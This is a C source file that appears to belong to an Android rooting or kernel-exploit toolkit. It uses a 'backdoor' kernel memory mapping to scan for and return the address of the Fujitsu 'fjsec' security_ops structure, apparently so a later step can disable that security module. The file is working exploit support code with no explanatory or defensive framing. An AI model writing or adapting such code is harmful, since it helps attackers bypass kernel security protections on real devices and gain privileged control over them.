#include <stdbool.h>
#include <string.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"
#include "fjsec/fjsec.h"

typedef struct _supported_device {
  device_id_t device_id;
  unsigned long int security_ops_address;
} supported_device;

static supported_device supported_devices[] = {
};

static int n_supported_devices = (sizeof (supported_devices) / sizeof (supported_devices[0]));

static const char security_ops_tag[SECURITY_NAME_MAX + 1] = "fjsec";


static bool
check_security_ops(unsigned long int *security_ops)
{
  unsigned long int kernel_start, kernel_end;

  kernel_start = (unsigned long int)backdoor_convert_to_kernel_address((void *)BACKDOOR_MMAP_ADDRESS);
  kernel_end = kernel_start + BACKDOOR_MMAP_SIZE;

  if (security_ops[SECURITY_OPS_OFFSET] >= kernel_start
   && security_ops[SECURITY_OPS_OFFSET] < kernel_end) {
    return true;
  }

  return false;
}

void *get_fjsec_security_ops()
{
  device_id_t device_id = detect_device();
  void *security_ops;
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      return (void *)supported_devices[i].security_ops_address;
    }
  }

  for (security_ops = (void *)BACKDOOR_MMAP_ADDRESS; security_ops; security_ops += 4) {
    void *end = (void *)BACKDOOR_MMAP_ADDRESS + BACKDOOR_MMAP_SIZE;

    security_ops = memmem(security_ops, end - security_ops, security_ops_tag, sizeof security_ops_tag);
    if (check_security_ops(security_ops)) {
      return backdoor_convert_to_kernel_address(security_ops);
    }
  }

  return NULL;
}
